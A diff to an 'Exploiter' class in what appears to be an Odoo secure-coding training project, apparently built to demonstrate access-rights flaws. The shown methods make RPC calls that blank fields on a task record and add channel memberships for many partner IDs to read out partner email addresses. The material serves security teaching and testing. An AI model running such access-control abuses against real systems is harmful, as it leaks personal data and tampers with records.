@@ -201,16 +201,15 @@ class Exploiter:
         Then, the definitions of each fields is available in the model class:
         safer_code/models/task.py
         """
-        task_id = self.rpc("safer_code.task", "search", [], limit=1)[0]
         self.rpc(
             "safer_code.task",
             "write",
-            [task_id],
+            [1],
             {
-                'name': None,
-                'description': None,
-                'partner_id': None,
-                'partner_email': None,
+                "name": None,
+                "description": None,
+                "partner_id": None,
+                "partner_email": None,
             },
         )
 
@@ -250,10 +249,12 @@ class Exploiter:
         test: safer_code/tests/test_leak_3_master_the_rules.py
         odoo-bin -d safer_db --test-tags .test_unsafe_access_rights_channel_partner
         """
-        channel_id = self.rpc("safer_code.mail.channel", "search", [], limit=1)[0]
-        for partner_id in range(11, 30):
-            self.rpc("safer_code.mail.channel.partner", "create", {"partner_id": partner_id, "channel_id": channel_id})
-        print(self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"]))  # noqa: T201
+        result = self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"])
+        print(result)  # noqa: T201
+        for partner_id in range(30):
+            self.rpc("safer_code.mail.channel.partner", "create", {"partner_id": partner_id, "channel_id": 1})
+        result = self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"])
+        print(result)  # noqa: T201
 
     @user("portal")
     def leak_password_1(self):
